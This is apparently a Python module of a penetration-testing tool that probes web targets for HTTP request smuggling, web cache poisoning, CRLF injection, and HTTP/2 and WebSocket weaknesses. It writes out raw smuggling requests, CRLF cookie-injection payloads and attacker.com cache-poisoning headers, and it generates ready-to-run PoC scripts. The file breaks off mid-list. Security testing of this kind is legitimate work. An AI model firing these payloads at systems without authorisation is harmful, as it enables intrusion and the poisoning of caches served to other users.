"""
mod_advanced_http.py — Advanced HTTP Protocol Testing Module (`hakuza http-advanced`)

Protocol-level vulnerability detection that standard HTTP libraries miss:
  - HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, obfuscation)
  - Web Cache Poisoning (unkeyed headers, parameter cloaking)
  - HTTP Request Splitting (CRLF injection)
  - HTTP/2 Attacks (pseudo-header abuse, flow control)
  - WebSocket Exploitation (handshake bypass, message injection)
  - Raw Socket Execution (bypass HTTP libs, craft custom packets)

This module works with raw sockets and low-level HTTP parsing to detect
vulnerabilities that don't surface in standard requests library behavior.
Every finding includes reproducible curl/nc commands and standalone PoC scripts.

Integrates with hakuza findings pipeline and mod_active_ai.py's PoC validator.
"""

import re
import os
import sys
import json
import time
import socket
import base64
import hashlib
import secrets
import threading
import http.server
import socketserver
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urlencode
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, asdict
import io

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text

# ---------------------------------------------------------------------------
# Lazy HAKUZA imports (prevent circular deps)
# ---------------------------------------------------------------------------

def _hakuza():
    import hakuza
    return hakuza

def _mod_active_ai():
    try:
        import mod_active_ai
        return mod_active_ai
    except ImportError:
        return None


# ---------------------------------------------------------------------------
# Data Models
# ---------------------------------------------------------------------------

@dataclass
class HTTPFinding:
    """Finding from advanced HTTP testing"""
    title: str
    severity: str  # critical, high, medium, low, info
    description: str
    category: str  # smuggling, cache_poisoning, http_splitting, http2, websocket
    evidence: str  # raw request/response or detailed explanation
    curl_command: Optional[str] = None
    python_poc: Optional[str] = None
    test_type: Optional[str] = None
    timestamp: str = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()

    def to_dict(self):
        return asdict(self)


@dataclass
class SMTPayload:
    """HTTP Request Smuggling payload variant"""
    name: str
    request_body: bytes
    description: str


# ---------------------------------------------------------------------------
# 1. RequestSmugglingTester
# ---------------------------------------------------------------------------

class RequestSmugglingTester:
    """Test for HTTP Request Smuggling (CL.TE, TE.CL, TE.TE)"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[HTTPFinding] = []
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.netloc
        self.path = self.parsed_url.path or "/"
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == "https" else 80)
        self.is_https = self.parsed_url.scheme == "https"

    def test_cl_te(self) -> Optional[HTTPFinding]:
        """Content-Length / Transfer-Encoding: chunked smuggling"""
        # CL.TE: server processes CL, backend processes TE (chunked)
        # Smuggled request goes to backend, frontend sees it as part of response

        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"SMUGGLED_REQ"  # This gets sent to backend
        ).encode()

        try:
            response = self._send_raw(request, "CL.TE")
            if response and b"smuggled" in response.lower():
                finding = HTTPFinding(
                    title="HTTP Request Smuggling: CL.TE (Content-Length / Transfer-Encoding)",
                    severity="high",
                    description=(
                        "Server prioritizes Content-Length while backend prioritizes "
                        "Transfer-Encoding: chunked. Allows smuggling requests to backend."
                    ),
                    category="smuggling",
                    evidence=f"Raw response excerpt:\n{response[:500].decode('utf-8', errors='replace')}",
                    curl_command=self._gen_curl_cl_te(),
                    python_poc=self._gen_poc_cl_te(),
                    test_type="CL.TE"
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            pass

        return None

    def test_te_cl(self) -> Optional[HTTPFinding]:
        """Transfer-Encoding: chunked / Content-Length smuggling"""
        # TE.CL: server processes TE (chunked), backend processes CL

        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 3\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"5\r\n"
            f"SMUGG\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        try:
            response = self._send_raw(request, "TE.CL")
            if response:
                finding = HTTPFinding(
                    title="HTTP Request Smuggling: TE.CL (Transfer-Encoding / Content-Length)",
                    severity="high",
                    description=(
                        "Server prioritizes Transfer-Encoding: chunked while backend "
                        "prioritizes Content-Length. Allows request smuggling."
                    ),
                    category="smuggling",
                    evidence=f"Raw response excerpt:\n{response[:500].decode('utf-8', errors='replace')}",
                    curl_command=self._gen_curl_te_cl(),
                    python_poc=self._gen_poc_te_cl(),
                    test_type="TE.CL"
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            pass

        return None

    def test_te_te_obfuscation(self) -> Optional[HTTPFinding]:
        """Transfer-Encoding obfuscation smuggling"""
        # TE.TE with obfuscation: both parse TE but differently due to obfuscation

        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Transfer-Encoding: x\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"5\r\n"
            f"HELLO\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        try:
            response = self._send_raw(request, "TE.TE obfuscation")
            if response:
                finding = HTTPFinding(
                    title="HTTP Request Smuggling: TE.TE via Obfuscation",
                    severity="high",
                    description=(
                        "Front-end and backend both process Transfer-Encoding but parse "
                        "obfuscated variants differently. Allows smuggling via conflicting interpretation."
                    ),
                    category="smuggling",
                    evidence=f"Raw response excerpt:\n{response[:500].decode('utf-8', errors='replace')}",
                    curl_command=self._gen_curl_te_te_obfuscation(),
                    python_poc=self._gen_poc_te_te_obfuscation(),
                    test_type="TE.TE obfuscation"
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            pass

        return None

    def _send_raw(self, request: bytes, test_name: str) -> Optional[bytes]:
        """Send raw HTTP request and capture response"""
        try:
            if self.is_https:
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
                sock = context.wrap_socket(sock, server_hostname=self.host)
            else:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)

            sock.sendall(request)
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            sock.close()
            return response
        except socket.timeout:
            return None
        except Exception as e:
            return None

    def _gen_curl_cl_te(self) -> str:
        """Generate curl for CL.TE"""
        return (
            f"# CL.TE Smuggling Test\n"
            f"# Note: curl doesn't support raw TE headers well; use nc instead:\n"
            f"curl -v -X POST '{self.target_url}' "
            f"-H 'Transfer-Encoding: chunked' "
            f"-H 'Content-Length: 13' "
            f"--data-binary $'0\\r\\n\\r\\nSMUGGLED_REQ'"
        )

    def _gen_poc_cl_te(self) -> str:
        """Generate Python PoC for CL.TE"""
        return f"""
import socket
import ssl

target = "{self.target_url}"
host = "{self.host}"
port = {self.port}

request = (
    "POST / HTTP/1.1\\r\\n"
    f"Host: {{host}}\\r\\n"
    "Content-Length: 13\\r\\n"
    "Transfer-Encoding: chunked\\r\\n"
    "Connection: keep-alive\\r\\n"
    "\\r\\n"
    "0\\r\\n"
    "\\r\\n"
    "SMUGGLED_REQ"
).encode()

sock = socket.create_connection((host, port), timeout=10)
{"sock = ssl.wrap_socket(sock, server_hostname=host)" if self.is_https else ""}
sock.sendall(request)
response = sock.recv(4096)
print(response.decode("utf-8", errors="replace"))
sock.close()
"""

    def _gen_curl_te_cl(self) -> str:
        return (
            f"# TE.CL Smuggling Test\n"
            f"curl -v -X POST '{self.target_url}' "
            f"-H 'Transfer-Encoding: chunked' "
            f"-H 'Content-Length: 3' "
            f"--data-binary $'5\\r\\nSMUGG\\r\\n0\\r\\n\\r\\n'"
        )

    def _gen_poc_te_cl(self) -> str:
        return f"""
import socket
import ssl

host = "{self.host}"
port = {self.port}

request = (
    "POST / HTTP/1.1\\r\\n"
    f"Host: {{host}}\\r\\n"
    "Transfer-Encoding: chunked\\r\\n"
    "Content-Length: 3\\r\\n"
    "Connection: keep-alive\\r\\n"
    "\\r\\n"
    "5\\r\\nSMUGG\\r\\n"
    "0\\r\\n"
    "\\r\\n"
).encode()

sock = socket.create_connection((host, port), timeout=10)
{"sock = ssl.wrap_socket(sock, server_hostname=host)" if self.is_https else ""}
sock.sendall(request)
response = sock.recv(4096)
print(response.decode("utf-8", errors="replace"))
sock.close()
"""

    def _gen_curl_te_te_obfuscation(self) -> str:
        return (
            f"# TE.TE Obfuscation Test\n"
            f"curl -v -X POST '{self.target_url}' "
            f"-H 'Transfer-Encoding: chunked' "
            f"-H 'Transfer-Encoding: x' "
            f"--data-binary $'5\\r\\nHELLO\\r\\n0\\r\\n\\r\\n'"
        )

    def _gen_poc_te_te_obfuscation(self) -> str:
        return f"""
import socket
import ssl

host = "{self.host}"
port = {self.port}

request = (
    "POST / HTTP/1.1\\r\\n"
    f"Host: {{host}}\\r\\n"
    "Transfer-Encoding: chunked\\r\\n"
    "Transfer-Encoding: x\\r\\n"
    "Connection: keep-alive\\r\\n"
    "\\r\\n"
    "5\\r\\nHELLO\\r\\n"
    "0\\r\\n"
    "\\r\\n"
).encode()

sock = socket.create_connection((host, port), timeout=10)
{"sock = ssl.wrap_socket(sock, server_hostname=host)" if self.is_https else ""}
sock.sendall(request)
response = sock.recv(4096)
print(response.decode("utf-8", errors="replace"))
sock.close()
"""


# ---------------------------------------------------------------------------
# 2. CachePoisoningTester
# ---------------------------------------------------------------------------

class CachePoisoningTester:
    """Test for Web Cache Poisoning"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[HTTPFinding] = []
        self.parsed_url = urlparse(target_url)

    def test_unkeyed_headers(self) -> Optional[HTTPFinding]:
        """Detect cache behavior with unkeyed headers (X-Forwarded-Host, etc.)"""
        if not HAS_REQUESTS:
            return None

        try:
            # First request: establish baseline
            resp1 = requests.get(
                self.target_url,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )

            # Second request with poisoning header
            resp2 = requests.get(
                self.target_url,
                headers={"X-Forwarded-Host": "attacker.com"},
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )

            # Check if response differs (indicates unkeyed header reflection)
            if resp1.text != resp2.text and "attacker.com" in resp2.text:
                finding = HTTPFinding(
                    title="Web Cache Poisoning: Unkeyed Header Reflection",
                    severity="high",
                    description=(
                        "The application reflects X-Forwarded-Host header in response "
                        "without including it in cache key. Cache can be poisoned to serve "
                        "attacker-controlled content to all users."
                    ),
                    category="cache_poisoning",
                    evidence=(
                        f"Baseline response hash: {hashlib.md5(resp1.text.encode()).hexdigest()}\n"
                        f"With X-Forwarded-Host response hash: {hashlib.md5(resp2.text.encode()).hexdigest()}\n"
                        f"Reflection found: 'attacker.com' present in second response"
                    ),
                    curl_command=self._gen_curl_unkeyed_header(),
                    python_poc=self._gen_poc_unkeyed_header(),
                    test_type="Unkeyed Header"
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            pass

        return None

    def test_parameter_cloaking(self) -> Optional[HTTPFinding]:
        """Detect cache parameter cloaking vulnerabilities"""
        if not HAS_REQUESTS:
            return None

        try:
            # URL with extra parameter that might be ignored by cache
            url_with_param = f"{self.target_url}{'?' if '?' not in self.target_url else '&'}utm_source=attacker"

            resp1 = requests.get(self.target_url, timeout=self.timeout, verify=False)
            resp2 = requests.get(url_with_param, timeout=self.timeout, verify=False)

            # If responses are identical despite different URLs, parameter might be ignored
            if resp1.text == resp2.text and resp1.status_code == resp2.status_code:
                finding = HTTPFinding(
                    title="Web Cache Poisoning: Parameter Cloaking (Ignored Parameter)",
                    severity="medium",
                    description=(
                        "URL parameter is ignored by cache key. Different URLs with this "
                        "parameter return identical cached content, allowing attackers to "
                        "poison cache by manipulating ignored parameters."
                    ),
                    category="cache_poisoning",
                    evidence=(
                        f"Response to {self.target_url}: {len(resp1.text)} bytes\n"
                        f"Response to {url_with_param}: {len(resp2.text)} bytes\n"
                        f"Responses identical: {resp1.text == resp2.text}"
                    ),
                    curl_command=self._gen_curl_param_cloaking(),
                    python_poc=self._gen_poc_param_cloaking(),
                    test_type="Parameter Cloaking"
                )
                self.findings.append(finding)
                return finding
        except Exception as e:
            pass

        return None

    def _gen_curl_unkeyed_header(self) -> str:
        return (
            f"curl -v '{self.target_url}' "
            f"-H 'X-Forwarded-Host: attacker.com' "
            f"-H 'X-Original-Host: attacker.com' "
            f"-H 'X-Host: attacker.com' "
            f"-k"
        )

    def _gen_poc_unkeyed_header(self) -> str:
        return f"""
import requests

url = "{self.target_url}"
headers_poison = {{"X-Forwarded-Host": "attacker.com"}}

resp = requests.get(url, headers=headers_poison, verify=False)
if "attacker.com" in resp.text:
    print("VULNERABLE: Unkeyed header reflected in response")
else:
    print("Not vulnerable or header not reflected")
"""

    def _gen_curl_param_cloaking(self) -> str:
        parsed = urlparse(self.target_url)
        sep = "&" if "?" in self.target_url else "?"
        return (
            f"# Request 1: baseline\n"
            f"curl -v '{self.target_url}'\n\n"
            f"# Request 2: with parameter that might be ignored\n"
            f"curl -v '{self.target_url}{sep}utm_source=attacker'"
        )

    def _gen_poc_param_cloaking(self) -> str:
        return f"""
import requests
import hashlib

url = "{self.target_url}"
parsed = urlparse(url)
sep = "&" if "?" in url else "?"

resp1 = requests.get(url, verify=False)
resp2 = requests.get(f"{{url}}{{sep}}utm_source=attacker", verify=False)

hash1 = hashlib.md5(resp1.text.encode()).hexdigest()
hash2 = hashlib.md5(resp2.text.encode()).hexdigest()

if hash1 == hash2:
    print(f"VULNERABLE: Different URLs return identical cached content")
    print(f"Hash: {{hash1}}")
"""


# ---------------------------------------------------------------------------
# 3. HTTPSplittingTester
# ---------------------------------------------------------------------------

class HTTPSplittingTester:
    """Test for HTTP Response Splitting / CRLF Injection"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[HTTPFinding] = []
        self.parsed_url = urlparse(target_url)

    def test_crlf_injection(self) -> Optional[HTTPFinding]:
        """Test CRLF injection in headers"""
        if not HAS_REQUESTS:
            return None

        try:
            # Attempt CRLF in User-Agent (or similar header)
            payloads = [
                "test%0D%0ASet-Cookie:%20admin=true",
                "test%0d%0aX-Injected:%20header",
                "test%0a%0dSet-Cookie:%20session=pwned",
            ]

            for payload in payloads:
                url = f"{self.target_url}{'?' if '?' not in self.target_url else '&'}user_input={payload}"
                try:
                    resp = requests.get(url, timeout=self.timeout, verify=False)
                    # Check if injected headers appear in response
                    if b"admin=true" in resp.content or b"Injected" in resp.content:
                        finding = HTTPFinding(
                            title="HTTP Response Splitting / CRLF Injection",
                            severity="high",
                            description=(
                                "Unvalidated user input in HTTP response allows CRLF "
                                "injection. Attacker can inject arbitrary headers or "
                                "split response to inject malicious content."
                            ),
                            category="http_splitting",
                            evidence=f"Payload: {payload}\nInjected content reflected in response",
                            curl_command=self._gen_curl_crlf(payload),
                            python_poc=self._gen_poc_crlf(payload),
                            test_type="CRLF Injection"
                        )
                        self.findings.append(finding)
                        return finding
                except:
                    pass
        except Exception as e:
            pass

        return None

    def _gen_curl_crlf(self, payload: str) -> str:
        return f"curl -v '{self.target_url}?input={payload}' -k"

    def _gen_poc_crlf(self, payload: str) -> str:
        return f"""
import requests

url = "{self.target_url}"
payload = "{payload}"
resp = requests.get(f"{{url}}?input={{payload}}", verify=False)

if b"Injected" in resp.content or b"admin=" in resp.content:
    print("VULNERABLE: CRLF Injection detected")
else:
    print("Not vulnerable")
"""


# ---------------------------------------------------------------------------
# 4. HTTP2Attacker
# ---------------------------------------------------------------------------

class HTTP2Attacker:
    """Test for HTTP/2 specific vulnerabilities"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[HTTPFinding] = []
        self.parsed_url = urlparse(target_url)

    def test_pseudo_header_abuse(self) -> Optional[HTTPFinding]:
        """Test HTTP/2 pseudo-header manipulation"""
        # HTTP/2 allows testing :authority, :path, :scheme, :method manipulation
        # This is mostly informational as actual exploitation requires h2 library

        finding = HTTPFinding(
            title="HTTP/2 Pseudo-Header Abuse (Potential)",
            severity="medium",
            description=(
                "HTTP/2 pseudo-headers (:authority, :path, :scheme, :method) can be "
                "manipulated if not properly validated. Exploitation requires h2 library "
                "and a vulnerable server that accepts malformed pseudo-headers."
            ),
            category="http2",
            evidence=(
                "This test requires the h2 library. Manual testing recommended.\n"
                "Test vectors:\n"
                "  - :path with leading/trailing spaces\n"
                "  - Missing :authority with Host header\n"
                "  - Uppercase :method values"
            ),
            python_poc=self._gen_poc_http2_pseudo_headers(),
            test_type="Pseudo-Header Abuse"
        )
        self.findings.append(finding)
        return finding

    def test_flow_control_abuse(self) -> Optional[HTTPFinding]:
        """Test HTTP/2 flow control vulnerabilities"""

        finding = HTTPFinding(
            title="HTTP/2 Flow Control Abuse (Potential)",
            severity="medium",
            description=(
                "HTTP/2 flow control (WINDOW_UPDATE frames) can be abused to trigger "
                "DoS or state machine violations if not properly implemented."
            ),
            category="http2",
            evidence=(
                "Requires h2 library for direct testing. Manual reconnaissance:\n"
                "  - Observe SETTINGS frame: check window size\n"
                "  - Send WINDOW_UPDATE with oversized deltas\n"
                "  - Send WINDOW_UPDATE on closed streams\n"
                "  - Monitor for connection resets"
            ),
            test_type="Flow Control Abuse"
        )
        self.findings.append(finding)
        return finding

    def _gen_poc_http2_pseudo_headers(self) -> str:
        return """
# Requires: pip install h2
try:
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    import socket
    import ssl

    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()

    # Send request with potentially dangerous pseudo-headers
    conn.send_headers(1, [
        (":method", "GET"),
        (":path", "/ "),  # Trailing space
        (":scheme", "https"),
        (":authority", "example.com"),
    ])

    # Observe server response behavior
except ImportError:
    print("h2 library not installed. Install with: pip install h2")
"""

    def _gen_poc_flow_control(self) -> str:
        return """
# Requires: pip install h2
try:
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    import h2.frame_factories as frames

    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)

    # Send oversized WINDOW_UPDATE
    frame = frames.build_window_update_frame(stream_id=1, increment=2**31-1)
    conn.send(frame)

except ImportError:
    print("h2 library required")
"""


# ---------------------------------------------------------------------------
# 5. WebSocketExploit
# ---------------------------------------------------------------------------

class WebSocketExploit:
    """Test for WebSocket vulnerabilities"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[HTTPFinding] = []
        self.parsed_url = urlparse(target_url)

    def test_handshake_bypass(self) -> Optional[HTTPFinding]:
        """Test WebSocket handshake validation"""

        finding = HTTPFinding(
            title="WebSocket Handshake Validation (Manual Testing Required)",
            severity="medium",
            description=(
                "WebSocket handshake can be exploited if Sec-WebSocket-Key validation "
                "is weak or if Origin header isn't properly checked."
            ),
            category="websocket",
            evidence=(
                "Test vectors:\n"
                "  - Send handshake without Sec-WebSocket-Key\n"
                "  - Send handshake with invalid Sec-WebSocket-Accept response\n"
                "  - Omit Origin header (CSRF on WS)\n"
                "  - Use different Origin header"
            ),
            python_poc=self._gen_poc_handshake_bypass(),
            test_type="Handshake Bypass"
        )
        self.findings.append(finding)
        return finding

    def test_message_injection(self) -> Optional[HTTPFinding]:
        """Test WebSocket message injection"""

        finding = HTTPFinding(
            title="WebSocket Message Injection (Manual Testing Required)",
            severity="high",
            description=(
                "WebSocket messages may allow injection of commands or cross-site "
                "WebSocket hijacking (CSWSH) if Origin validation is missing."
            ),
            category="websocket",
            evidence=(
                "Test:\n"
                "  1. Establish WS connection\n"
                "  2. Send messages with special chars: \\n, \\r, \\x00\n"
                "  3. Monitor for command injection in message processing\n"
                "  4. Test CSWSH: establish connection from different origin"
            ),
            python_poc=self._gen_poc_message_injection(),
            test_type="Message Injection"
        )
        self.findings.append(finding)
        return finding

    def _gen_poc_handshake_bypass(self) -> str:
        return f"""
import socket
import hashlib
import base64

host = "{self.parsed_url.netloc}"
path = "{self.parsed_url.path or '/'}"

# Send WebSocket handshake WITHOUT proper Sec-WebSocket-Key
handshake = (
    f"GET {{path}} HTTP/1.1\\r\\n"
    f"Host: {{host}}\\r\\n"
    f"Upgrade: websocket\\r\\n"
    f"Connection: Upgrade\\r\\n"
    f"Sec-WebSocket-Version: 13\\r\\n"
    f"Origin: https://attacker.com\\r\\n"
    # Missing or invalid Sec-WebSocket-Key
    f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\n"
    f"\\r\\n"
)

sock = socket.create_connection((host, 80), timeout=10)
sock.sendall(handshake.encode())
response = sock.recv(1024)
print(response.decode("utf-8", errors="replace"))
sock.close()
"""

    def _gen_poc_message_injection(self) -> str:
        return f"""
# Requires: pip install websocket-client
try:
    from websocket import create_connection

    ws_url = "{self.target_url}".replace("http", "ws")
    ws = create_connection(ws_url, origin="https://attacker.com")

    # Send message with potential injection
    ws.send("test\\n\\rInjected Command")
    response = ws.recv()
    print(f"Response: {{response}}")

    ws.close()
except ImportError:
    print("websocket-client required: pip install websocket-client")
"""


# ---------------------------------------------------------------------------
# 6. RawSocketExecutor
# ---------------------------------------------------------------------------

class RawSocketExecutor:
    """Execute custom raw socket packets"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[HTTPFinding] = []
        self.parsed_url = urlparse(target_url)

    def send_custom_packet(self, raw_bytes: bytes, description: str) -> Tuple[bool, bytes]:
        """Send raw packet and return response"""
        try:
            host = self.parsed_url.netloc.split(":")[0]
            port = int(self.parsed_url.port) if self.parsed_url.port else (443 if self.parsed_url.scheme == "https" else 80)

            if self.parsed_url.scheme == "https":
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((host, port), timeout=self.timeout)
                sock = context.wrap_socket(sock, server_hostname=host)
            else:
                sock = socket.create_connection((host, port), timeout=self.timeout)

            sock.sendall(raw_bytes)
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            sock.close()
            return True, response
        except Exception as e:
            return False, str(e).encode()

    def test_custom_protocol(self, packet: bytes, name: str) -> Optional[HTTPFinding]:
        """Test arbitrary protocol packet"""
        success, response = self.send_custom_packet(packet, name)

        if not success:
            return None

        finding = HTTPFinding(
            title=f"Custom Protocol Test: {name}",
            severity="info",
            description=f"Sent custom packet and received response",
            category="protocol",
            evidence=f"Response (first 500 bytes):\n{response[:500].decode('utf-8', errors='replace')}",
            test_type="Custom Protocol"
        )
        return finding


# ---------------------------------------------------------------------------
# 7. Test Infrastructure (Mock Server)
# ---------------------------------------------------------------------------

class MockHTTPServer(http.server.SimpleHTTPRequestHandler):
    """Mock server for testing HTTP protocol handling"""

    def log_message(self, format, *args):
        pass  # Suppress logging

    def do_GET(self):
        # Echo the request path
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(f"Received GET {self.path}".encode())

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"POST received")


def start_test_server(port: int = 8888) -> Tuple[socketserver.TCPServer, threading.Thread]:
    """Start mock server for protocol testing"""
    server = socketserver.TCPServer(("127.0.0.1", port), MockHTTPServer)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


# ---------------------------------------------------------------------------
# 8. Comprehensive Test Suite
# ---------------------------------------------------------------------------

def run_comprehensive_tests(target_url: str, console: Optional[Console] = None) -> List[HTTPFinding]:
    """Run all advanced HTTP tests against target"""
    if console is None:
        console = Console()

    all_findings: List[HTTPFinding] = []

    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings()

    console.print("[bold cyan]Advanced HTTP Protocol Testing[/bold cyan]")
    console.print()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console,
        transient=True,
    ) as progress:
        # Test Request Smuggling
        task = progress.add_task("Testing Request Smuggling...", total=None)
        smuggler = RequestSmugglingTester(target_url)
        smuggler.test_cl_te()
        smuggler.test_te_cl()
        smuggler.test_te_te_obfuscation()
        all_findings.extend(smuggler.findings)
        progress.update(task, completed=True)

        # Test Cache Poisoning
        task = progress.add_task("Testing Web Cache Poisoning...", total=None)
        cache = CachePoisoningTester(target_url)
        cache.test_unkeyed_headers()
        cache.test_parameter_cloaking()
        all_findings.extend(cache.findings)
        progress.update(task, completed=True)

        # Test HTTP Splitting
        task = progress.add_task("Testing HTTP Splitting / CRLF Injection...", total=None)
        splitter = HTTPSplittingTester(target_url)
        splitter.test_crlf_injection()
        all_findings.extend(splitter.findings)
        progress.update(task, completed=True)

        # Test HTTP/2
        task = progress.add_task("Testing HTTP/2 Vulnerabilities...", total=None)
        http2 = HTTP2Attacker(target_url)
        http2.test_pseudo_header_abuse()
        http2.test_flow_control_abuse()
        all_findings.extend(http2.findings)
        progress.update(task, completed=True)

        # Test WebSocket
        task = progress.add_task("Testing WebSocket Vulnerabilities...", total=None)
        ws = WebSocketExploit(target_url)
        ws.test_handshake_bypass()
        ws.test_message_injection()
        all_findings.extend(ws.findings)
        progress.update(task, completed=True)

    return all_findings


# ---------------------------------------------------------------------------
# 9. CLI Command Integration
# ---------------------------------------------------------------------------

def cmd_http_advanced(args):
    """CLI command for hakuza http-advanced"""
    hakuza = _hakuza()
    console = Console()

    if not args.target:
        console.print("[red]Error: --target required[/red]")
        return False

    target = args.target
    console.print(Panel(
        f"[bold]Advanced HTTP Protocol Testing[/bold]\n"
        f"Target: {target}",
        border_style="cyan"
    ))

    # Run tests
    findings = run_comprehensive_tests(target, console)

    if not findings:
        console.print("[yellow]No vulnerabilities detected[/yellow]")
        return True

    # Display findings
    console.print()
    table = Table(title="Advanced HTTP Findings")
    table.add_column("Title", style="cyan")
    table.add_column("Severity", style="yellow")
    table.add_column("Category", style="magenta")

    for finding in findings:
        severity_color = {
            "critical": "red",
            "high": "orange3",
            "medium": "yellow",
            "low": "green",
            "info": "blue",
        }.get(finding.severity, "white")

        table.add_row(
            finding.title,
            f"[{severity_color}]{finding.severity}[/{severity_color}]",
            finding.category
        )

    console.print(table)
    console.print()

    # Offer to save findings
    if args.save:
        try:
            if hasattr(hakuza, 'add_finding'):
                for finding in findings:
                    hakuza.add_finding(
                        title=finding.title,
                        severity=finding.severity,
                        description=finding.description,
                        evidence=finding.evidence,
                        source="advanced-http"
                    )
                console.print(f"[green]✓ Saved {len(findings)} findings to database[/green]")
        except Exception as e:
            console.print(f"[yellow]Warning: Could not save findings ({e})[/yellow]")

    return True


def register_argparse(sub):
    """Register hakuza http-advanced command"""
    p_http = sub.add_parser(
        "http-advanced",
        help="Advanced HTTP protocol testing: smuggling, cache poisoning, HTTP/2, WebSocket"
    )
    p_http.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., https://target.com/path)"
    )
    p_http.add_argument(
        "--smuggle",
        action="store_true",
        help="Test HTTP Request Smuggling only"
    )
    p_http.add_argument(
        "--cache",
        action="store_true",
        help="Test Web Cache Poisoning only"
    )
    p_http.add_argument(
        "--http2",
        action="store_true",
        help="Test HTTP/2 vulnerabilities only"
    )
    p_http.add_argument(
        "--websocket",
        action="store_true",
        help="Test WebSocket vulnerabilities only"
    )
    p_http.add_argument(
        "--save",
        action="store_true",
        help="Save findings to engagement database"
    )
    p_http.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default 10)"
    )


# ---------------------------------------------------------------------------
# 10. Advanced Payload Variations and Edge Cases
# ---------------------------------------------------------------------------

class PayloadGenerator:
    """Generate protocol-specific payloads for advanced testing"""

    @staticmethod
    def cl_te_variations() -> List[Tuple[str, bytes]]:
        """Generate Content-Length / Transfer-Encoding payload variations"""
        return [
            ("Classic CL.TE", b"POST / HTTP/1.1\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPAYLOAD"),
            ("Chunked with trailer", b"POST / HTTP/1.1\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nHELLO\r\n0\r\n\r\n"),
            ("Multiple TE headers", b"POST / HTTP/1.1\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nPAYLOAD"),
            ("Obfuscated TE", b"POST / HTTP/1.1\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nPAYLOAD"),
        ]

    @staticmethod
    def cache_poisoning_headers() -> List[str]:
        """Generate cache poisoning header payloads"""
        return [
            "X-Forwarded-Host: attacker.com",
            "X-Forwarded-For: 127.0.0.1",
            "X-Forwarded-Proto: https",
            "X-Original-Host: attacker.com",
            "X-Host: attacker.com",
            "X-Rewrite-URL: /admin",
            "X-Url-Scheme: http",
        ]

    @staticmethod
    def crlf_payloads() -> List[str]:
        """Generate CRLF injection payloads"""
        return [
            "%0d%0aSet-Cookie:%20admin=true",
            "%0d%0aX-Injected:%20header",
            "%0a%0dSet-Cookie:%20session=pwned",
            "test%0d%0a%0d%0aInjected Body",
            "%0d%0aContent-Length:%200",
        ]

    @staticmethod
    def http2_pseudo_header_payloads() -> List[Dict[str, str]]:
        """Generate HTTP/2 pseudo-header manipulation payloads"""
        return [
